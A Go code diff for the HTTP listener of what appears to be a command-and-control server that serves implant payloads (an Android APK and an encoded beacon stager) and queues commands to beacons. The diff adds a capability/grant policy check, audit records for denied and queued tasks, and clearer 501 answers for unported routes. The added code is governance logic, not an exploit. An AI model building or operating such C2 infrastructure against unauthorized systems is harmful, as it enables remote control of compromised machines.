@@ -65,20 +65,34 @@ var payloadDownloadName = map[string]string{
 	"/api/v1/remote_payload_android": "remote.apk",
 }
 
-// Server binds the store and key material to an HTTP handler.
+// Server binds the store, the task policy and the key material to an HTTP
+// handler.
 type Server struct {
 	cfg    *Config
 	store  *Store
 	guard  *ReplayGuard
+	policy *TaskPolicy
 	logger *log.Logger
 }
 
-// NewServer builds a listener over the given store.
+// NewServer builds a listener over the given store, seeding the task policy
+// from the environment exactly as the Python control plane does.
 func NewServer(cfg *Config, store *Store, logger *log.Logger) *Server {
+	return NewServerWithPolicy(cfg, store, logger, NewTaskPolicyFromEnv())
+}
+
+// NewServerWithPolicy is NewServer with an explicit policy (tests, and an
+// operator that seeds grants programmatically).
+func NewServerWithPolicy(cfg *Config, store *Store, logger *log.Logger,
+	policy *TaskPolicy) *Server {
+	if policy == nil {
+		policy = NewTaskPolicy()
+	}
 	return &Server{
 		cfg:    cfg,
 		store:  store,
 		guard:  NewReplayGuardAt(filepath.Join(cfg.DataDir, "c2_replay.json")),
+		policy: policy,
 		logger: logger,
 	}
 }
@@ -101,8 +115,8 @@ func (s *Server) Handler() http.Handler {
 		mux.HandleFunc("GET "+p, s.transferToken(s.handlePayload(p)))
 	}
 	// /x (PIC) is a plain file fetch, ported here (C-3). /s/android needs the
-	// Python dropper generator and stays in the control plane: answer
-	// honestly instead of 404-ing silently.
+	// Python dropper generator and stays in the control plane: answer 501 with
+	// a machine-readable body instead of 404-ing silently.
 	mux.HandleFunc("GET /x", s.transferToken(s.handlePIC))
 	mux.HandleFunc("GET /s/android", s.transferToken(s.handleNotPorted))
 	// The root and the malleable catch-all. {$} matches ONLY "/".
@@ -345,25 +359,87 @@ func (s *Server) handleBeacons(w http.ResponseWriter, _ *http.Request) {
 	writeJSON(w, http.StatusOK, s.store.Beacons())
 }
 
+// handleQueue polices a queued task the SAME way the Python listener does
+// (D-2): operator auth first, then the capability/grant policy. A denied task
+// is a 403 with the policy reason and an audit record, because "the operator
+// token was valid" is not the same statement as "this beacon may be asked to
+// do this".
 func (s *Server) handleQueue(w http.ResponseWriter, r *http.Request) {
 	var body struct {
-		BeaconID string `json:"beacon_id"`
-		Command  string `json:"command"`
+		BeaconID     string   `json:"beacon_id"`
+		Command      string   `json:"command"`
+		CapabilityID string   `json:"capability_id"`
+		Args         []string `json:"args"`
+		ScopeRef     string   `json:"scope_ref"`
+		TaskID       string   `json:"task_id"`
+		ExpiresAt    float64  `json:"expires_at"`
+		TTLSeconds   int      `json:"ttl_seconds"`
 	}
 	if err := json.NewDecoder(io.LimitReader(r.Body, maxRequestBody)).Decode(&body); err != nil {
 		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "invalid JSON"})
 		return
 	}
-	// NOTE: the capability/grant task policy lives in the Python control
-	// plane. This endpoint is operator-only (mTLS + token); do not expose it
-	// beyond the operator network until the policy is ported.
-	if _, err := s.store.QueueTask(body.BeaconID, body.Command); err != nil {
+	if body.BeaconID == "" {
+		writeJSON(w, http.StatusBadRequest,
+			map[string]any{"error": "beacon_id required"})
+		return
+	}
+
+	// 1. the policy decides (typed form when a capability is named, the
+	//    explicit legacy adapter for a raw string).
+	var decision PolicyDecision
+	if body.CapabilityID != "" {
+		if !ValidTaskID(body.TaskID) {
+			decision = PolicyDecision{Reason: "invalid task_id",
+				Mode: "typed-denied"}
+		} else {
+			decision = s.policy.CheckTyped(body.BeaconID, TypedTask{
+				CapabilityID: body.CapabilityID, Args: body.Args,
+				ScopeRef: body.ScopeRef, ExpiresAt: body.ExpiresAt,
+				TaskID: body.TaskID}, nowSeconds())
+		}
+	} else {
+		decision = s.policy.CheckCommand(body.BeaconID, body.Command)
+	}
+	if !decision.Allowed {
+		s.logger.Printf("task denied for %s (%s): %s", body.BeaconID,
+			decision.Mode, decision.Reason)
+		s.store.audit("task_denied", map[string]any{
+			"beacon_id": body.BeaconID, "reason": decision.Reason,
+			"mode":    decision.Mode,
+			"command": truncate(decision.Command, body.Command, 200)})
+		writeJSON(w, http.StatusForbidden, map[string]any{
+			"error": decision.Reason, "mode": decision.Mode})
+		return
+	}
+
+	// 2. only then does it reach the queue.
+	taskID, err := s.store.QueueTaskWithTTL(body.BeaconID, decision.Command,
+		body.TTLSeconds)
+	if err != nil {
 		writeJSON(w, http.StatusBadRequest, map[string]any{"error": err.Error()})
 		return
 	}
 	s.store.audit("task_queued", map[string]any{
-		"beacon_id": body.BeaconID, "bytes": len(body.Command)})
-	writeJSON(w, http.StatusOK, map[string]any{"status": "queued"})
+		"beacon_id": body.BeaconID, "task_id": taskID,
+		"bytes": len(decision.Command), "mode": decision.Mode})
+	writeJSON(w, http.StatusOK, map[string]any{
+		"status": "queued", "task_id": taskID, "mode": decision.Mode})
+}
+
+// truncate renders a command for the audit record: the queued form, capped.
+func truncate(values ...any) string {
+	text := ""
+	for _, v := range values {
+		if s, ok := v.(string); ok && s != "" {
+			text = s
+			break
+		}
+	}
+	if len(text) > 200 {
+		return text[:200]
+	}
+	return text
 }
 
 func (s *Server) handleResults(w http.ResponseWriter, r *http.Request) {
@@ -381,6 +457,7 @@ func (s *Server) handleResults(w http.ResponseWriter, r *http.Request) {
 // Python control plane (C-3/D-2). Anything false here is served by the Python
 // listener and answered with 501 on this surface.
 func (s *Server) handleCapabilities(w http.ResponseWriter, _ *http.Request) {
+	auditOK, records, _ := s.store.AuditVerify()
 	writeJSON(w, http.StatusOK, map[string]any{
 		"data_plane":     "c2d",
 		"wire_protocol":  "v1",
@@ -389,10 +466,16 @@ func (s *Server) handleCapabilities(w http.ResponseWriter, _ *http.Request) {
 		"payloads":       true,
 		"replay_persist": true,
 		"audit_log":      s.store.auditEnabled(),
-		"task_policy":    false, // D-2: capability/grant policy stays in Python
+		"audit_chain":    s.store.auditEnabled(),
+		"audit_records":  records,
+		"audit_intact":   auditOK,
+		"retention":      MaxResultsPerBeacon,
+		"task_policy":    true, // D-2 ported: grants + legacy adapter
+		"task_lease":     TaskLeaseSeconds,
 		"stager_pic":     true,  // C-3: /x is served from PayloadDir here
 		"stager_android": false, // C-3: /s/android needs the Python generator
 		"operator_api":   true,
+		"high_impact":    HighImpactVerbs,
 	})
 }
 
@@ -438,9 +521,19 @@ func (s *Server) handlePIC(w http.ResponseWriter, r *http.Request) {
 	http.ServeContent(w, r, "beacon_xored.bin", info.ModTime(), f)
 }
 
+// handleNotPorted answers the routes the Go data plane deliberately does not
+// implement — currently only /s/android, which needs the Python dropper
+// generator. The answer is a 501 with a MACHINE-readable body, so a caller
+// (and `doctor`) can tell "this backend does not serve it" apart from "the
+// payload was not built" (404) and from "unknown endpoint" (404).
 func (s *Server) handleNotPorted(w http.ResponseWriter, _ *http.Request) {
-	http.Error(w, "this stager is served by the Python control plane (c2d "+
-		"does not port it yet)", http.StatusNotImplemented)
+	writeJSON(w, http.StatusNotImplemented, map[string]any{
+		"error":      "this stager is not served by the Go data plane",
+		"handled_by": "python-control-plane",
+		"route":      "/s/android",
+		"hint": "run the Python listener (config set c2.transport_backend " +
+			"python) for this route",
+	})
 }
 
 // ── malleable catch-all ────────────────────────────────────────────────
